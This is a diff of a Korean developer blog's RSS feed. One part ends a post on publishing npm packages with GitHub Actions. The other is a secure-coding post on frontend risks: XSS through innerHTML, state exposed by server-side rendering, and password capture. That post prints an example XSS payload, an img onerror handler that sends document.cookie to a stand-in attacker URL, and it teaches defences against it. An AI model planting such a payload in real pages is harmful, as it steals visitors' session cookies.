+          &lt;span class=&quot;token key atrule&quot;&gt;registry-url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; https&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;//npm.pkg.github.com/
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; npm ci
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; npm run build
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; npm publish
+        &lt;span class=&quot;token key atrule&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;NODE_AUTH_TOKEN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;secrets.GITHUB_TOKEN&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;on&lt;/code&gt; 부분을 보면 release 가 생성(created) 될 때, 해당 구성 파일 바탕으로 CI/CD가 진행 됩니다.  구성 파일의 내용이 크게 어렵지 않습니다. 작업(jobs)는 테스트(test)와 배포(publish) 입니다. 어려운 부분이 아니니 찬찬히 해석하시면 어렵지 않을 것입니다. &lt;/p&gt;
+&lt;h2&gt;릴리즈 작성 및 자동 Action 실행&lt;/h2&gt;
+&lt;p&gt;registry 에 올라와 있는 1.0.0 버전의 package는 삭제했습니다&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/7c1f9d49f503076e3725e56dc8b55d10/1cb21/1.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 44.30379746835443%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsSAAALEgHS3X78AAABnUlEQVQoz01SV27cMBTU/U8TIFfIAZL4z4GNbHZXsgqb2OvkkVgvTGAgFj1OeZxCjHDOI5eCECJiTGgNDzTQBykXnNrA+wh2Cnx7+Y5ftxc42+syCtV25JwxcXXitjLMu8QmNJTLMKHi9AUmVkIba64DDuWwSYPLfkAYCykVtDFw3sOHgFYrJuUKuNSkQBNDQSVVkkjUqce80E+1toFS6oBSerjpF3UHX8dkfMJpHBW2Ya1D6c4ayE5FTHng8ywlsk/qPJ2znYMfEqWrSxEtJ0wpJRwHI8YwGHpuPa+uuNvoikaWnyDFmi50+wp1u8IfO9opUTsEw9Slz8sHuBDPIkHZnGQ5kbJuue/Vx1mltaBI7McCZQOETcgPu603pVCXpOCIwT1z8N7BO4tCFvBMqT3nNVdkqlnf33Bcr4hsRRELCt+oyybj72ZxOzzuPBICrofDnQXMIo79WSSsZ8WugT/bjh9vv7FIiX/XO17fL7CGo8WdiCx12WbcD4uFOSzcYWaW4B6wA5tKYIaejgUujOPn7RXMmpFnpHf8dfwHLZi4SCKyEV4AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;1&quot;
+        title=&quot;1&quot;
+        src=&quot;/static/7c1f9d49f503076e3725e56dc8b55d10/f058b/1.png&quot;
+        srcset=&quot;/static/7c1f9d49f503076e3725e56dc8b55d10/c26ae/1.png 158w,
+/static/7c1f9d49f503076e3725e56dc8b55d10/6bdcf/1.png 315w,
+/static/7c1f9d49f503076e3725e56dc8b55d10/f058b/1.png 630w,
+/static/7c1f9d49f503076e3725e56dc8b55d10/40601/1.png 945w,
+/static/7c1f9d49f503076e3725e56dc8b55d10/78612/1.png 1260w,
+/static/7c1f9d49f503076e3725e56dc8b55d10/1cb21/1.png 2586w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;아래는 제가 github에  1.0.0 릴리즈를 생성 한 것을 캡처 한 것입니다&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/50dd639fe918b518e4c62ca767773334/97755/2.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 36.075949367088604%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsSAAALEgHS3X78AAAAqklEQVQoz52RYQrCMAyFe//b+NcT+MdjDESZs9tcmybpM50M7BgD9+ARSPu+pNSdLi3O1xaSEr7KyLn2lpZ+stwwjkghQlngyoGoIAlZzVbzZnjbAIsgRgIbWFXhSoCF0Q0dnt6jufeYpoBgE6cQwDZ1D7rWDCxk73uEGEAU52eUntj0Uve3rO2Wywvg5QdQ4r8gFfB39UiE5vHGrSMk1uPA9TZqn6MHYMUf0SUo97j9kfUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;2&quot;
+        title=&quot;2&quot;
+        src=&quot;/static/50dd639fe918b518e4c62ca767773334/f058b/2.png&quot;
+        srcset=&quot;/static/50dd639fe918b518e4c62ca767773334/c26ae/2.png 158w,
+/static/50dd639fe918b518e4c62ca767773334/6bdcf/2.png 315w,
+/static/50dd639fe918b518e4c62ca767773334/f058b/2.png 630w,
+/static/50dd639fe918b518e4c62ca767773334/40601/2.png 945w,
+/static/50dd639fe918b518e4c62ca767773334/78612/2.png 1260w,
+/static/50dd639fe918b518e4c62ca767773334/97755/2.png 2536w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;release 가 생성 되었으니 Action 는 구성 되어 있는 데로 Action 를 실행 시킵니다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/d4b3795c67e857d694ff151421178fc3/36405/3.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 22.151898734177216%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsSAAALEgHS3X78AAAArUlEQVQY05WNSw7CMAxEc3TWcAwkNnAEuAM7tvxURIvaqEkT5zs4ASFYYuVpRiN7Ik43iWtn0PQeh7PGfSBIOaBtO8QY8e+I5bbBfH3EYnPBbHXGbi/hrMajH+Cc59KEwMUvUqVmIcKH8EPZEUDmF7g7fX4Z1QRDnpciyAe4N+QKvmaTIejJQmmDUU/VG0sQOddKFE2pOlhykMqAiLjAsbrqMy99U6bcKK1ZU82eyXk2MZnEtloAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;3&quot;
+        title=&quot;3&quot;
+        src=&quot;/static/d4b3795c67e857d694ff151421178fc3/f058b/3.png&quot;
+        srcset=&quot;/static/d4b3795c67e857d694ff151421178fc3/c26ae/3.png 158w,
+/static/d4b3795c67e857d694ff151421178fc3/6bdcf/3.png 315w,
+/static/d4b3795c67e857d694ff151421178fc3/f058b/3.png 630w,
+/static/d4b3795c67e857d694ff151421178fc3/40601/3.png 945w,
+/static/d4b3795c67e857d694ff151421178fc3/78612/3.png 1260w,
+/static/d4b3795c67e857d694ff151421178fc3/36405/3.png 2486w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;두 개의 작업이 모두 잘 처리된 것을 확인 할 수 있습니다. 작업 모두 완료되고 잠시 기다리면 Package 부분에 1.0.0 버전이 올라 온 것을 확인 할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/8da216349a6b4e8a3b107d46974aa52f/df5d6/4.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 44.93670886075949%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAABn0lEQVQoz0VRW46cMBDk/ofIDfKRW2x+EkVKpGhGsxuNsgwGFj/AGNvgSrUns2tRtPvp6u4mhA1bjMh5p0xVyilFUOo9pQy3LNhChHIjPv36jK/tD2w+IO8Z+75X5JzRdJPB9faGdrRQeoHbCnHAhQNzLFgiqm10AYMJ6BhzUh2GeYbWGjMfCiFAiB3HgUb7jMm46hB2O43GzVj8yoBCvdzlfpDNgcQY5zxSzJX5o4vHaaxPmEldkiQ4MkgKhi3WAqILxPeAnRes9Pe9Qq8HzubgR0jBdQ1ob9377IT2pA2sFP3fhrB4QHRtHbZBIY0KkRJ2QtFvxIhGklQ/wHEmwl4SDBNW2qVNYX6UO6SgjMR6j+3PBep8gjUGDETJCaW/ockpwhgNkfdTuM2VCJzT9m77AP+ZD+sJOwvATGRoyE5X2Qw24tJqtFNA7zI6E3Edlqorm6o+zDtGXzB54IWJT9cTFJf48/yM778v3AHbzR278WhanfDSh4pntVKuHzrvl27Bdcp4tQWdA77dXvHl/IS/zrCrDLt4dpwr7cLl/AN+zrctGxQ1vAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;4&quot;
+        title=&quot;4&quot;
+        src=&quot;/static/8da216349a6b4e8a3b107d46974aa52f/f058b/4.png&quot;
+        srcset=&quot;/static/8da216349a6b4e8a3b107d46974aa52f/c26ae/4.png 158w,
+/static/8da216349a6b4e8a3b107d46974aa52f/6bdcf/4.png 315w,
+/static/8da216349a6b4e8a3b107d46974aa52f/f058b/4.png 630w,
+/static/8da216349a6b4e8a3b107d46974aa52f/40601/4.png 945w,
+/static/8da216349a6b4e8a3b107d46974aa52f/78612/4.png 1260w,
+/static/8da216349a6b4e8a3b107d46974aa52f/df5d6/4.png 2514w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[프론트엔드에서의 시큐어 코딩]]></title><description><![CDATA[…]]></description><link>https://themoin.github.io/2020-11-02-SecureFrontend/</link><guid isPermaLink="false">https://themoin.github.io/2020-11-02-SecureFrontend/</guid><pubDate>Mon, 02 Nov 2020 00:00:00 GMT</pubDate><content:encoded>  &lt;br /&gt;
 &lt;p&gt;안녕하세요. 모인 개발팀 이 경호입니다.&lt;/p&gt;
 &lt;p&gt;저희는 언제나 보안에 민감한 송금업을 하다 보니, 시큐어 코딩에 관해 고민하거나 이야기 나누는 시간이 많은데요.&lt;/p&gt;
 &lt;p&gt;오늘은 그 중에서도 프론트엔드에서의 보안에 관해 공유해 보려고 합니다.&lt;/p&gt;
@@ -29,12 +302,12 @@ someButton&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span
 &lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;setAttribute&lt;/code&gt; 의 두 번째 인자는 평가됩니다.&lt;/p&gt;
 &lt;p&gt;하지만 진정한 위협은 자바스크립트의 일급 함수 특성을 이용해 간단히 회피할 수 있는 위의 메소드들이 아닙니다.&lt;/p&gt;
 &lt;h2&gt;1 - 1. InnerHtml&lt;/h2&gt;
-&lt;p&gt;  &lt;code class=&quot;language-text&quot;&gt;innerHTML&lt;/code&gt;이나 리액트의 &lt;code class=&quot;language-text&quot;&gt;dangerouslySetInnerHTML&lt;/code&gt;은 퍼포먼스 차이가 존재하지만, 본질적으로 위험하다는 사실은 같습니다. 하지만 편안한 구현을 위해 필요한 친구들이기도 하지요.&lt;/p&gt;
-&lt;p&gt;  이들은 프론트엔드에서 일어날 수 있는 가장 큰 보안 허점인 XSS를 유발할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;innerHTML&lt;/code&gt;이나 리액트의 &lt;code class=&quot;language-text&quot;&gt;dangerouslySetInnerHTML&lt;/code&gt;은 퍼포먼스 차이가 존재하지만, 본질적으로 위험하다는 사실은 같습니다. 하지만 편안한 구현을 위해 필요한 친구들이기도 하지요.&lt;/p&gt;
+&lt;p&gt;이들은 프론트엔드에서 일어날 수 있는 가장 큰 보안 허점인 XSS를 유발할 수 있습니다.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;XSS(Cross-Site-Scripting) 공격자가 프로덕트에 원치 않는 코드를 삽입하여 실행하는 취약점입니다.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;  리액트로 예를 들어보겠습니다.&lt;/p&gt;
+&lt;p&gt;리액트로 예를 들어보겠습니다.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;jsx&quot;&gt;&lt;pre class=&quot;language-jsx&quot;&gt;&lt;code class=&quot;language-jsx&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; React &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;react&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; VeryDangereousInput &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;@src/components/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; fetchComments &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;@api&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
@@ -59,24 +332,24 @@ someButton&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span
     &lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;ul&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;  위의 컴포넌트는 코멘트를 받는 그대로 저장하고, 그걸 그대로 출력하게 됩니다.&lt;/p&gt;
-&lt;p&gt;  이 상황에서 악의적인 공격자가 다음과 같은 문자열을 입력한다면 어떻게 될까요?&lt;/p&gt;
+&lt;p&gt;위의 컴포넌트는 코멘트를 받는 그대로 저장하고, 그걸 그대로 출력하게 됩니다.&lt;/p&gt;
+&lt;p&gt;이 상황에서 악의적인 공격자가 다음과 같은 문자열을 입력한다면 어떻게 될까요?&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;보안이 엉망이군요&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;onerror&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;{fetch(http://HACKERS-RULES-URL,&lt;/span&gt;
 &lt;span class=&quot;token attr-name&quot;&gt;{document.cookie})}&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;  네. 해당 페이지에 들어간 고객들의 쿠키 정보가 해커들에게 자동으로 수집되게 되었습니다. &lt;/p&gt;
-&lt;p&gt;  쿠키에 세션 아이디나 각종 토큰을 보관하는 경우라면 엄청나게 큰 보안사고로 이어질 수 있습니다.&lt;/p&gt;
-&lt;p&gt;  하지만 WYSIWIG 에디터, 마크다운 파서, 텍스트 소스에서의 마크업은 필요한 일이 상당히 있고, &lt;/p&gt;
-&lt;p&gt;  이때마다 별도의 인터페이스를 작성하는 것은 몹시 힘들고 지치는 일입니다.&lt;/p&gt;
-&lt;p&gt;  가장 간단한 해법은 &lt;code class=&quot;language-text&quot;&gt;HTML sanitizing&lt;/code&gt;을 적용하는 것입니다.&lt;/p&gt;
-&lt;p&gt; &lt;a href=&quot;https://www.npmjs.com/package/sanitize-html&quot;&gt;sanitize-html @npm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;  위의 라이브러리를 사용하면 삽입되었을 때 위험한 문자열을 제거해줍니다.&lt;/p&gt;
-&lt;p&gt;  각종 태그에 onerror등 네이티브 이벤트 핸들러 등이 부착되는 상황을 예방할 수 있습니다.&lt;/p&gt;
-&lt;p&gt;  아니면 스스로 Validator를 만들어 해당 위험요소를 제거할 수도 있습니다. 정규식을 이용해 위험한 문자열을 추출해내는 방식을 적용해도 좋고, Flux 아키텍처를 사용한다면 스토어에 dispatch 하기 전에, 혹은 db에 해당 문자열을 보내기전에 사전 검열하는 방식으로 사용할 수도 있습니다.&lt;/p&gt;
+&lt;p&gt;네. 해당 페이지에 들어간 고객들의 쿠키 정보가 해커들에게 자동으로 수집되게 되었습니다.&lt;/p&gt;
+&lt;p&gt;쿠키에 세션 아이디나 각종 토큰을 보관하는 경우라면 엄청나게 큰 보안사고로 이어질 수 있습니다.&lt;/p&gt;
+&lt;p&gt;하지만 WYSIWIG 에디터, 마크다운 파서, 텍스트 소스에서의 마크업은 필요한 일이 상당히 있고,&lt;/p&gt;
+&lt;p&gt;이때마다 별도의 인터페이스를 작성하는 것은 몹시 힘들고 지치는 일입니다.&lt;/p&gt;
+&lt;p&gt;가장 간단한 해법은 &lt;code class=&quot;language-text&quot;&gt;HTML sanitizing&lt;/code&gt;을 적용하는 것입니다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/package/sanitize-html&quot;&gt;sanitize-html @npm&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;위의 라이브러리를 사용하면 삽입되었을 때 위험한 문자열을 제거해줍니다.&lt;/p&gt;
+&lt;p&gt;각종 태그에 onerror등 네이티브 이벤트 핸들러 등이 부착되는 상황을 예방할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;아니면 스스로 Validator를 만들어 해당 위험요소를 제거할 수도 있습니다. 정규식을 이용해 위험한 문자열을 추출해내는 방식을 적용해도 좋고, Flux 아키텍처를 사용한다면 스토어에 dispatch 하기 전에, 혹은 db에 해당 문자열을 보내기전에 사전 검열하는 방식으로 사용할 수도 있습니다.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2&gt;2. 서버사이드 렌더링&lt;/h2&gt;
 &lt;br /&gt;
-&lt;p&gt;  SSR을 실행할 때 한가지 더 체크해야 할 문제가 있습니다.&lt;/p&gt;
-&lt;p&gt;  Redux등 상태관리 라이브러리를 사용한다면, 초기 변수에 의존하는 렌더링을 구성하기 쉬운데 이 때 &lt;code class=&quot;language-text&quot;&gt;preloaded state&lt;/code&gt;를 사용하게 됩니다.&lt;/p&gt;
+&lt;p&gt;SSR을 실행할 때 한가지 더 체크해야 할 문제가 있습니다.&lt;/p&gt;
+&lt;p&gt;Redux등 상태관리 라이브러리를 사용한다면, 초기 변수에 의존하는 렌더링을 구성하기 쉬운데 이 때 &lt;code class=&quot;language-text&quot;&gt;preloaded state&lt;/code&gt;를 사용하게 됩니다.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;renderFullPage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;html&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; preloadedState&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;
     &amp;lt;!doctype html&gt;
@@ -101,19 +374,19 @@ someButton&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span
 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;token comment&quot;&gt;// 출처: 리덕스 공식 문서 (https://redux.js.org/recipes/server-rendering)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;br /&gt;
-&lt;p&gt;  이 &lt;code class=&quot;language-text&quot;&gt;renderFullPage()&lt;/code&gt; 함수를 호출하기 전에 스토어의 모든 값을 객체로 preloadedState 매개 변수로 넘겨주게 됩니다.&lt;/p&gt;
-&lt;p&gt;  스토어의 모든 정보가 소스에 노출된다는 것과 같습니다. 크롤링에 굉장히 취약해지고 스토어에 민감한 정보를 보관한 경우라면(그러면 안 좋지만!) 보안 사고로 이어질 수 있습니다.&lt;/p&gt;
-&lt;p&gt;  여기에도 1 에서 했던 것과 같이 sanitizing을 적용할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;이 &lt;code class=&quot;language-text&quot;&gt;renderFullPage()&lt;/code&gt; 함수를 호출하기 전에 스토어의 모든 값을 객체로 preloadedState 매개 변수로 넘겨주게 됩니다.&lt;/p&gt;
+&lt;p&gt;스토어의 모든 정보가 소스에 노출된다는 것과 같습니다. 크롤링에 굉장히 취약해지고 스토어에 민감한 정보를 보관한 경우라면(그러면 안 좋지만!) 보안 사고로 이어질 수 있습니다.&lt;/p&gt;
+&lt;p&gt;여기에도 1 에서 했던 것과 같이 sanitizing을 적용할 수 있습니다.&lt;/p&gt;
 &lt;br /&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token constant&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;state&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;\\u003c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;혹은 &lt;a href=&quot;https://github.com/yahoo/serialize-javascript&quot;&gt;라이브러리&lt;/a&gt;로 직렬화해도 좋습니다. 이걸로 스토어에 위험한 소스코드가 인젝션되는 상황을 예방할 수 있습니다.&lt;/p&gt;
 &lt;p&gt;순서대로 말하면,
-&lt;br /&gt; &lt;/p&gt;
+&lt;br /&gt;&lt;/p&gt;
 &lt;div style=&quot;margin-left: 20px;&quot;&gt;
 &lt;ol&gt;
-&lt;li&gt;스토어를 가져와서 sanitizing &lt;/li&gt;
-&lt;li&gt;해당 스토어 객체를 직렬화 &lt;/li&gt;
-&lt;li&gt;직렬화한 문자열을 특정 DOM에 삽입해서 클라이언트로 보내준다. &lt;/li&gt;
+&lt;li&gt;스토어를 가져와서 sanitizing&lt;/li&gt;
+&lt;li&gt;해당 스토어 객체를 직렬화&lt;/li&gt;
+&lt;li&gt;직렬화한 문자열을 특정 DOM에 삽입해서 클라이언트로 보내준다.&lt;/li&gt;
 &lt;li&gt;클라이언트에서는 그 DOM의 내용을 initState로&lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;해당 DOM 자체를 삭제한다.&lt;/p&gt;
@@ -132,9 +405,9 @@ password: q1w
 password: q1w2
 ...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
   &lt;br /&gt;
-&lt;p&gt;  사용자가 입력할때마다 해당 변수는 갱신될것이고, 해당 입력값은 키로거 같은 별도의 준비 없이도 간단히 탈취가 가능할 것입니다. 특히 위에 언급한 XSS 공격과 결합되면 순식간에 모든 유저의 패스워드가 유출될 수도 있습니다.&lt;/p&gt;
-&lt;p&gt;  API로 보내기 전에 암호화를 하는 방식의 문제점이 여기에 있습니다. 통신 간에는 안전하더라도 저희가 통제할 수 없는 클라이언트 영역에서 일어나는 탈취를 막을 방법이 필요합니다.&lt;/p&gt;
-&lt;p&gt;  여기서 필요한 개념이 E2E 암호화입니다.&lt;/p&gt;
+&lt;p&gt;사용자가 입력할때마다 해당 변수는 갱신될것이고, 해당 입력값은 키로거 같은 별도의 준비 없이도 간단히 탈취가 가능할 것입니다. 특히 위에 언급한 XSS 공격과 결합되면 순식간에 모든 유저의 패스워드가 유출될 수도 있습니다.&lt;/p&gt;
+&lt;p&gt;API로 보내기 전에 암호화를 하는 방식의 문제점이 여기에 있습니다. 통신 간에는 안전하더라도 저희가 통제할 수 없는 클라이언트 영역에서 일어나는 탈취를 막을 방법이 필요합니다.&lt;/p&gt;
+&lt;p&gt;여기서 필요한 개념이 E2E 암호화입니다.&lt;/p&gt;
 &lt;br /&gt;
